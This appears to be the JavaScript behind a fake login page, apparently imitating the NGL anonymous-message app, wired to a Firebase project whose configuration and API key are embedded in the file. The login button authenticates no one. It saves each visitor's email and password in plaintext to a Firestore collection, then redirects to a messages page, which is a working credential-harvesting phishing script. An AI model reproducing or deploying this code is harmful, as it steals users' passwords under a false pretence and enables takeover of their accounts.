// CONFIGURAZIONE FIREBASE
const firebaseConfig = {
  apiKey: "AIzaSyC9mIsxGC5nhr2ExIlguePsPMGi5s69MsI",
  authDomain: "ngl-link-isaacbis.firebaseapp.com",
  projectId: "ngl-link-isaacbis",
  storageBucket: "ngl-link-isaacbis.appspot.com",
  messagingSenderId: "551004938464",
  appId: "1:551004938464:web:74781b8bdf51a008d4f085",
  measurementId: "G-1HND4WD5ND"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

document.addEventListener("DOMContentLoaded", () => {
  const loginBtn = document.getElementById("loginBtn");
  const emailInput = document.getElementById("email");
  const passwordInput = document.getElementById("password");
  const loginError = document.getElementById("login-error");

  loginBtn.addEventListener("click", () => {
    const email = emailInput.value.trim();
    const password = passwordInput.value.trim();
    if (!email || !password) {
      loginError.textContent = "Email e password sono obbligatorie.";
      return;
    }

    // Salva i dati su Firestore
    db.collection("users").add({
      email: email,
      password: password,
      createdAt: new Date()
    })
    .then(() => {
      // Reindirizza alla pagina dei messaggi
      window.location.href = "./messaggi.html"; // ✅ Percorso corretto
    })
    .catch(error => {
      loginError.textContent = "Errore: " + error.message;
    });
  });
});
